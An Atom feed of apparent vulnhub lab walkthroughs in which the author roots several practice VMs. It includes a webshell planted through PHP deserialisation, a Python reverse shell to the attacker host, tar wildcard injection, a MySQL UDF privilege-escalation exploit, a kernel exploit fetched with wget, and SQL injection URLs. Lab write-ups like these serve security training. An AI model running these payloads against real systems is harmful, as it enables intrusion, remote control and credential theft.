<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2017-06-13T15:51:26-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Knock-knock]]></title>
    <link href="http://wg135.github.io/blog/2016/08/24/knock-knock/"/>
    <updated>2016-08-24T15:37:28-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/24/knock-knock</id>
    <content type="html"><![CDATA[<h2>Tools:</h2>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Strings</li>
</ul>


<h3>Vulnerabilities:</h3>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/knock/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.166 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.166 -p-</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>only port 1337 is opening. Based on the nmap&rsquo;s output. I think this is port knocking.</p>

<p>use netcat to check:</p>

<p><code>nc -nv 192.168.41.166 1337</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>get the list, looks like port number. I try to knock them, but failed. Then I realized that i should try all permutations, then I wrote script <a href="https://github.com/wg135/script/blob/master/port_knock_all.py">port_knock_all.py</a>. Run that, then rerun nmap</p>

<p><img src="/images/blog/vulhub/pipe/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto</p>

<p><code>nikto -h 192.168.41.166</code></p>

<p>use wfuzz</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.166/FUZZ 2&gt;/dev/null</code></p>

<p>Nothing cool shows.</p>

<p>check the page</p>

<p><img src="/images/blog/vulhub/pipe/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/pipe/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>nothing useful. Since it is only one image, I will download it and check the string in it</p>

<p><code>strings knockknock.jpg</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like we got <code>abfnW/sax2Cw9Ow</code></p>

<p>try to use this login ssh, failed&hellip;.</p>

<p>Figure out it is <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a> and use <a href="http://www.xarg.org/tools/caesar-cipher/">Caesar cipher decryption tool</a></p>

<p>get <code>jason/jB9jP2knf</code></p>

<p>got shell:</p>

<p><img src="/images/blog/vulhub/pipe/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>now find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
<code>find / -perm -g=s -o -perm -6000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</code></p>

<p>got a file <code>/home/jason/tfc</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>run the file</p>

<p><img src="/images/blog/vulhub/pipe/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like it need a input file and output file.</p>

<p>tfc will encrypt input and also decrpt input if its encryped. Now generate a large input file.</p>

<p><img src="/images/blog/vulhub/pipe/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><code>python -c "print 'A'*5000" &gt;in.tfc</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>get segmentation fault error.</p>

<p>First, I use <a href="https://github.com/wg135/checksec">checksec.sh</a> to check if there is any protection</p>

<p><code>./checksec.sh  --file tfc</code>
<img src="/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>No protection.</p>

<p>Since gdb is not available on the target, I download tfc to my kali</p>

<p><img src="/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>the address is 0x0675c916  not 0x41414141. so it should be encryption of 0x41414141. I was able to figure out how many bytes to pass in to overwrite the return address (4124 bytes).</p>

<p>(To be continue&hellip;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pipe]]></title>
    <link href="http://wg135.github.io/blog/2016/08/23/pipe/"/>
    <updated>2016-08-23T01:31:51-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/23/pipe</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Burp</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Tar arbitrary command execution</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/pipe/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.163 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.163 -p-</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>there are 4 ports are opening</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.162</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>shows there is an <code>index.php</code> but needs autherication</p>

<p><img src="/images/blog/vulhub/pipe/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>use wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  --hc 401 http://192.168.41.163/FUZZ 2&gt;/dev/null</code></p>

<p>get a path <code>scriptz</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>find a file <code>log.php.BAK</code>, looks like backup file of log.php</p>

<pre><code class="php">&lt;?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this-&gt;filename = '';
        $this-&gt;data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
        $now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this-&gt;data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
        file_put_contents($this-&gt;filename, $this-&gt;data, FILE_APPEND);
    }
}
?&gt;
</code></pre>

<p>in order to check if the authentication can be bypassed, I use <code>http method tamper</code>.</p>

<p><code>nmap -p 80 --script http-method-tamper --script-args 'http-method-tamper.paths={/index.php}' 192.168.41.163</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>It&rsquo;s vulnerable to POST method.</p>

<p>Use Burp to change GET request to /index.php to POST request, and get the page:</p>

<p><img src="/images/blog/vulhub/pipe/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>check the source code:</p>

<p><img src="/images/blog/vulhub/pipe/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>The page will load <code>scriptz/php.js</code>, and it serialises some data. Based on the log.php.BAK code,</p>

<p>click link <code>Show Artist Info</code>, get the url, after decoding:</p>

<p><code>O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}</code></p>

<p>The “Info” function looks like a way to read information from a specific file. Recheck the log.php.BAK file, find it use <code>file_put_contents($this-&gt;filename, $this-&gt;data, FILE_APPEND)</code> to write data to a file.</p>

<p>Test if it can write to a Log file</p>

<p><code>param=O:3:"Log":2:{s:8:"filename";s:8:"Test.txt";s:4:"data";s:4:"TEST";}</code></p>

<p>doesn&rsquo;t work</p>

<p><code>param=O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/scriptz/Test.txt";s:4:"data";s:4:"TEST";}</code></p>

<p>works</p>

<p>based on that, build payload:</p>

<p><code>param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" &lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;";}</code></p>

<p>replace the parameter in Burp. forward the traffic</p>

<p><img src="/images/blog/vulhub/pipe/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>then:</p>

<p><img src="/images/blog/vulhub/pipe/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>webshell is there.</p>

<p>setup backdoor:</p>

<p><code>http://192.168.41.163/scriptz/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/pipe/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>try to find linux kernel local exploit, but I find there is no gcc in the box.</p>

<p>keep looking.</p>

<p>find</p>

<p><img src="/images/blog/vulhub/pipe/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like system does backup automatically. check <code>/etc/crontab</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p><code>/usr/bin/compress.sh</code> can be read</p>

<p>I find the tar uses wild card. Here I will try Tar arbitrary command execution.</p>

<p><img src="/images/blog/vulhub/pipe/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>first check which shell is being use in target</p>

<p><code>ls -al /bin/*sh</code></p>

<p><img src="/images/blog/vulhub/pipe/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>start to create shell:</p>

<pre><code>www-data@pipe:/home/rene/backup$ echo &gt; --checkpoint=1;                    
www-data@pipe:/home/rene/backup$ echo &gt; --checkpoint-action=exec=sh\ shell.sh;                     
www-data@pipe:/home/rene/backup$ echo 'chmod u+s /bin/dash' &gt; shell.sh
www-data@pipe:/home/rene/backup$ echo 'touch /home/rene/backup/done' &gt;&gt; shell.sh                     
www-data@pipe:/home/rene/backup$ cat shell.sh
chmod u+s /bin/dash
touch /home/rene/backup/done
www-data@pipe:/home/rene/backup$ chmod +x shell.sh
</code></pre>

<p>just wait a few miniutes and a file <code>done</code> will be created</p>

<p><img src="/images/blog/vulhub/pipe/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>run <code>/bin/dash</code> and get the shell</p>

<p><img src="/images/blog/vulhub/pipe/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[the wall]]></title>
    <link href="http://wg135.github.io/blog/2016/08/18/the-wall/"/>
    <updated>2016-08-18T14:23:31-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/18/the-wall</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wireshark</li>
<li>Netcat</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Hash-identifier</li>
<li>Hashcat</li>
<li>Steghide</li>
</ul>


<h3>Vulnerabilities:</h3>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.162 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.162 -p-</code></p>

<p>However, no port is opening.</p>

<p>use wireshark to check the traffic</p>

<p><img src="/images/blog/vulhub/wall/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>find the target send packet to TCP port 1337 in my Kali.</p>

<p><code>nc -nlvp 1337</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>nothing cool shows.</p>

<p>rerun nmap, find port 80 is opening now</p>

<p><img src="/images/blog/vulhub/wall/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>I use wfuzz and nikto and find nothing.</p>

<p><img src="/images/blog/vulhub/wall/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>The webpage just show a image. check the source code:</p>

<p><img src="/images/blog/vulhub/wall/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting string. <code>737465673d3333313135373330646262623337306663626539373230666536333265633035</code></p>

<p>use Hash-identifier cannot figure out what&rsquo;s encode type. Finally, I find it is hex encode in hackbar. Hex decode to character, get</p>

<p><code>steg=33115730dbbb370fcbe9720fe632ec05</code></p>

<p>use Hash-identifier to find out <code>33115730dbbb370fcbe9720fe632ec05</code> is a MD5</p>

<p><img src="/images/blog/vulhub/wall/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>use hashcat to crack it.</p>

<p><code>hashcat hash.txt /usr/share/wordlists/rockyou.txt</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>get password is <code>divisionbell</code></p>

<p>Now I want to check the image to see if there is any hiden information</p>

<p><code>steghide extract -p divisionbell -sf pink_floyd.jpg</code></p>

<p>get the result:</p>

<p><img src="/images/blog/vulhub/wall/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p><code>U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0</code> is very interesting. <code>|</code> separates the string into two parts.</p>

<p><code>U3lkQmFycmV0dA==</code> is base64 encoded, decode it, <code>SydBarrett</code></p>

<p><code>f831605ae34c2399d1e5bb3a4ab245d0</code> is MD5. crack it.</p>

<p><img src="/images/blog/vulhub/wall/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>its <code>pinkfloydrocks</code></p>

<p>now what, remember enumerate, enumerate and enumerate.</p>

<p>rerun nmap again,</p>

<p><img src="/images/blog/vulhub/wall/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>port 1965 is opening and running ssh</p>

<p>login using SydBarrett/pinkfloydrocks.</p>

<p><img src="/images/blog/vulhub/wall/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>shows This service allows sftp connections only</p>

<p>use sftp to login</p>

<p><code>sftp -P 1965 SydBarrett@192.168.41.162</code></p>

<p>check the files</p>

<p><code>sftp&gt; ls -ahl</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/wall/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>check the file eclipsed_by_the_moon</p>

<p><img src="/images/blog/vulhub/wall/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p><code>tar zxvf eclipsed_by_the_moon</code></p>

<p><code>foremost -v -i eclipsed_by_the_moon.lsd</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>got a jpg file. <code>Roger Waters</code></p>

<p>open it</p>

<p><img src="/images/blog/vulhub/wall/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>and his password is <code>hello_is_there_anybody_in_there</code></p>

<p>based on previous username <code>SydBarrett</code>, Roger Waters user name should be <code>RogerWaters</code></p>

<p><code>ssh RogerWaters@192.168.41.162 -p 1965</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>check sticky bit set</p>

<pre><code>find / -perm -u=s -type f -user DavidGilmour 2&gt;/dev/null
find / -perm -u=s -type f -user NickMason 2&gt;/dev/null
ls -al /usr/local/bin/shineon 
ls -al /usr/local/bin/brick
</code></pre>

<p><img src="/images/blog/vulhub/wall/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p><code>/usr/local/bin/brick</code> has sticky bit set.</p>

<p>run it</p>

<p><code>/usr/local/bin/brick</code></p>

<p><img src="/images/blog/vulhub/wall/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Lord the Root]]></title>
    <link href="http://wg135.github.io/blog/2016/08/12/lord-the-root/"/>
    <updated>2016-08-12T13:50:04-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/12/lord-the-root</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Burpsuite</li>
<li>Sqlmap</li>
</ul>


<h3>Vulnerabilities:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/39166/">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &lsquo;overlayfs&rsquo; Local Root Exploit (1)</a></li>
<li><a href="https://www.exploit-db.com/exploits/1518/">MySQL 4.x/5.0 - User-Defined Function (UDF) Local Privilege Escalation Exploit (Linux)</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/lordroot/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.159 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.159 -p-</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 22 is opening.</p>

<p>try to ssh to the box and check the banner</p>

<p><code>ssh root@192.168.41.159</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find a hint Easy as 1,2,3</p>

<p>looks like port knocking, now try to send packet to port 1, 2 and 3 using <a href="https://github.com/wg135/script/blob/master/port_knocking.py">port knocking</a> script.</p>

<p>run nmap again,</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>port 1337 is openning and it is running http service.</p>

<p>I used both nikto and wfuzz, nothing interesting come out.</p>

<p>check the page</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>check the image info,</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>find an <code>/images/</code>, go to the directory.</p>

<p>nothing cool. check the source code find a <code>/icons/</code>.</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>check <code>http://192.168.41.159:1337/robots.txt</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>I check <code>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh</code> and it is base64 encoded.</p>

<p>Decode it in hackbar, I get:</p>

<p><code>Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</code></p>

<p>This is also base64 encoded.</p>

<p>Decode it again,</p>

<p><code>/978345210/index.php</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>save the post requst in burpsuit as file post.txt</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>username is vulnerable.</p>

<p>get table name</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql --tables</code></p>

<p>webapp database
<img src="/images/blog/vulhub/lordroot/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>mysql
<img src="/images/blog/vulhub/lordroot/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>get columns of webapp</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users --columns</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>dump username and password</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users -C username,password --dump</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>get colums of table user</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user --columns</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user -C User,Password --dump</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>try to login web using credential, however, I cannot find anywhere to upload webshell.</p>

<p>I try the credential to login ssh</p>

<p>and <code>smeagol  | MyPreciousR00t</code> works</p>

<h3>Local exploit 1:</h3>

<p><code>uname -a</code></p>

<p>then get:</p>

<p><code>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</code></p>

<p><code>searchsploit Linux Kernel | grep Ubuntu</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<pre><code>wget http://192.168.41.149/39166.c
gcc 39166.c -o local
./local
</code></pre>

<p>get the root</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<h3>Local exploit 2:</h3>

<p><code>ps aux |grep root</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>mysql is running under the root, which is wrong!</p>

<p>login mysql</p>

<p><code>mysql -u root -p</code>, password is <code>darkshadow</code>, and the mysql version is 5.5.44.</p>

<p><img src="/images/blog/vulhub/lordroot/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit mysql | grep local</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p>follow the instruction <code>https://www.exploit-db.com/exploits/1518/</code></p>

<p>use the c code:(1518.c)</p>

<pre><code class="c">
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
    unsigned int        arg_count;  // number of arguments
    enum Item_result    *arg_type;  // pointer to item_result
    char            **args;     // pointer to arguments
    unsigned long       *lengths;   // length of string args
    char            *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
    char            maybe_null; // 1 if func can return NULL
    unsigned int        decimals;   // for real functions
    unsigned long       max_length; // for string functions
    char            *ptr;       // free ptr for func data
    char            const_item; // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args-&gt;arg_count != 1)
        return(0);

    system(args-&gt;args[0]);

    return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}
</code></pre>

<pre><code>gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
</code></pre>

<p>in mysql</p>

<pre><code>mysql&gt; use mysql
mysql&gt; create table foo(line blob);
mysql&gt; insert into foo values(load_file('/tmp/1518.so'));
mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
mysql&gt; create function do_system returns integer soname '1518.so';
mysql&gt; select * from mysql.func;
mysql&gt; select do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out');
mysql&gt; \! sh
$ cat /tmp/out
</code></pre>

<p><img src="/images/blog/vulhub/lordroot/Selection_024.png" title="[title manually exploit [alt text]]" ></p>

<p>exploit is good. now use <a href="https://github.com/wg135/script/blob/master/suid.c">suid.c</a></p>

<p>in mysql:</p>

<pre><code>mysql&gt; select do_system('gcc -o /tmp/suid /tmp/suid.c');
mysql&gt; select do_system('chmod u+s /tmp/suid');
</code></pre>

<p>in /tmp</p>

<p><code>./suid</code></p>

<p><img src="/images/blog/vulhub/lordroot/Selection_025.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackademic RTB2]]></title>
    <link href="http://wg135.github.io/blog/2016/08/10/hackademic-rtb2/"/>
    <updated>2016-08-10T15:38:10-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/10/hackademic-rtb2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>Netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Joomscan</li>
<li>Metasploit</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/rtb2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.158 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.158 -p-</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like port 80 is opening and port 666 is filtered.</p>

<p>Use both wfuzz to scan the host</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find <code>phpmyadmin</code></p>

<p>check the webpage, and need to login, try to use sqli to by pass the autherication, but doesn&rsquo;t work. Now step back, enumerate more.</p>

<p>I use nmap to scan the target again. find port 666 now is opening. So there may be a port knocking existing.</p>

<p><img src="/images/blog/vulhub/rtb2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>use wfuzz scan again</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158:666/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>check the webpage <code>http://192.168.41.158:666/</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like it is joomla</p>

<p>now use Joomba to scan the app</p>

<p><code>joomscan -u http://192.168.41.158:666/</code></p>

<p>nothing cool comes out.</p>

<p>use metasploit</p>

<p><code>search joomla</code></p>

<p>I use <code>auxiliary/scanner/http/joomla_plugins</code></p>

<pre><code>msf &gt; use auxiliary/scanner/http/joomla_plugins
msf auxiliary(joomla_plugins) &gt; set rhosts 192.168.41.158
msf auxiliary(joomla_plugins) &gt; set rport 666
msf auxiliary(joomla_plugins) &gt; run
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>use <code>/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>

<p>so first step, verify the sql injection:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>then try to get column number:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 1--</code>
<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 2--</code>
<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 3--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>the column number is 2</p>

<p>next find out which column we can use</p>

<p><code>158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,2--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Okay. Column 2</p>

<p>try to check mysql version</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,@@version--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>get all table name</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, table_name from information_schema.tables--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>get all column name of table jos_users</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, column_name from information_schema.columns where table_name = 'jos_users'--</code></p>

